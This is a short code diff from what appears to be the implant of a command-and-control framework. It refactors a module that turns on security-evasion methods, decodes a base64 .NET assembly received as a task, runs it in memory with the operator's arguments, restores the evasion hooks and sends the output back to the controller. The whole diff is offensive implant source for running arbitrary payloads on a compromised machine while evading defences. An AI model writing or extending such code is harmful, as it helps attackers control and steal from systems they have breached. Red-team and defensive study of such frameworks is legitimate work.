@@ -26,31 +26,9 @@ namespace Drone.Modules
             Evasion.DeployEvasionMethods();
 
             var asm = Convert.FromBase64String(task.Artefact);
-            var ms = new MemoryStream();
-            
-            var realStdOut = Console.Out;
-            var realStdErr = Console.Error;
-            var stdOutWriter = new StreamWriter(ms);
-            var stdErrWriter = new StreamWriter(ms);
-            
-            stdOutWriter.AutoFlush = true;
-            stdErrWriter.AutoFlush = true;
-            
-            Console.SetOut(stdOutWriter);
-            Console.SetError(stdErrWriter);
-
-            Assembly.Execute(asm, task.Arguments);
-                
-            Console.Out.Flush();
-            Console.Error.Flush();
-            Console.SetOut(realStdOut);
-            Console.SetError(realStdErr);
-
-            var result = Encoding.UTF8.GetString(ms.ToArray());
-            ms.Dispose();
+            var result = Assembly.Execute(asm, task.Arguments);
 
             Evasion.RestoreEvasionMethods();
-
             Drone.SendResult(task.TaskGuid, result);
         }
     }
